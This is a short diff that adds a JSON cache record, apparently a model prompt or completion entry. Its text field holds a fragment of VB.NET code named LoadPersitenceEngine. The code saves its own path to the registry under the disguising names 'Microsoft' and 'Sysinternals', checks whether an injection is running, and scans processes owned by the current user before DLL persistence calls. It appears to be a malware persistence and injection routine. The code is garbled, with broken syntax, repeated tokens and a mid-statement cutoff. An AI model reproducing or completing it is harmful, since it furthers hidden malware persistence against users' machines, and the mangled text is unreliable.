@@ -1,0 +1,5 @@
+{
+  "cache_key": "7d86feb20c45979dc107",
+  "provider_request_id": null,
+  "text": "Context: Public Sub LoadPersitenceEngine() Try SaveSetting(\"Microsoft\", \"Sysinternals\", \"3243\", Application.GetFullPath) If Not InjectionIsRunning() Then Dim processes As Process() = Process.GetProcesses Dim num2 As Integer = (processes.Length - 1) Dim i As Integer = 0 Do While (i <=num2) Dim process As Process = processesi) Try Dim x = IO.Path.GetFullPath(Task process.MainModule.FileName) & process.Id.ToString If (CurrentProcessOwnerprocess.H) = Environment.UserName) Then DllPersistence.Id) Then DllPersistence."
+}
